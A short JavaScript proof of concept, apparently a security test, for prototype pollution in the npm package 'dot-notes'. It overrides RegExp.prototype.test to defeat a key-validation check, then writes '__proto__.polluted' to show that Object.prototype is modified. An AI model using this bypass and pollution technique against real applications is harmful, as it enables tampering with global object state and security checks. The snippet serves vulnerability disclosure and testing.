RegExp.prototype.test = () => false;
console.log({}.polluted);
const dots = require('dot-notes');
dots.create({}, '__proto__.polluted', 'yes');
console.log({}.polluted);